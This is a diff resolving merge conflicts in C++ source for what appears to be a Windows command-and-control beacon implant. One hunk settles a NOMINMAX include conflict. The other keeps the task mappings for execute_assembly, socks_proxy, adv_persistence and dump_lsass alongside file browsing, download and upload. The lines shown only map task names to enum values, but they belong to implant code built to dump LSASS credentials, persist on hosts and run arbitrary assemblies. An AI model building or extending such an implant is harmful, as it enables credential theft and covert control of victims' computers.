@@ -11,14 +11,9 @@
 #include <thread>
 #include <vector>
 #include <algorithm>
-#include <iterator>
-<<<<<<< HEAD
 #ifndef NOMINMAX
 #define NOMINMAX
 #endif
-=======
-#define NOMINMAX
->>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
 #include <windows.h>
 #include <winhttp.h>
 
@@ -41,13 +36,10 @@ namespace {
         if (str == "browse_fs") return beacon::TaskType::BROWSE_FS;
         if (str == "file_download") return beacon::TaskType::FILE_DOWNLOAD;
         if (str == "file_upload") return beacon::TaskType::FILE_UPLOAD;
-<<<<<<< HEAD
         if (str == "execute_assembly") return beacon::TaskType::EXECUTE_ASSEMBLY;
         if (str == "socks_proxy") return beacon::TaskType::SOCKS_PROXY;
         if (str == "adv_persistence") return beacon::TaskType::ADV_PERSISTENCE;
         if (str == "dump_lsass") return beacon::TaskType::DUMP_LSASS;
-=======
->>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
         // Add other mappings here
         return beacon::TaskType::UNKNOWN;
     }
